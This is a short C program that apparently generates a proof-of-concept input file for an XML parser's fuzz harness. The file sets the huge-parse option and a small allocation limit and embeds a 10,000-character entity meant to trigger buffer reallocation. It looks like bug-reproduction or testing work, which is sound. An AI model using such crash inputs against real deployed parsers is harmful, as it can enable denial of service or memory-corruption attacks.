#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write opts (4 bytes, big-endian, value 0x80000 = XML_PARSE_HUGE) */
    fputc(0x00, f); fputc(0x08, f); fputc(0x00, f); fputc(0x00, f);
    /* Write maxAlloc (4 bytes, big-endian, value 0x10000) */
    fputc(0x00, f); fputc(0x01, f); fputc(0x00, f); fputc(0x00, f);

    /* Write URL "test.xml" followed by backslash-newline */
    fwrite("test.xml", 1, 8, f);
    fputc('\\', f);
    fputc('\n', f);

    /* Write XML content followed by backslash-newline */
    fprintf(f, "<?xml version=\"1.0\"?>");
    fprintf(f, "<!DOCTYPE foo [");
    fprintf(f, "<!ENTITY x \"");
    /* Long entity value to trigger buffer reallocation */
    for (int i = 0; i < 10000; i++) {
        fputc('A', f);
    }
    fprintf(f, "\">");
    fprintf(f, "]");
    fprintf(f, "<root>&x;</root>");
    fputc('\\', f);
    fputc('\n', f);

    fclose(f);
    return 0;
}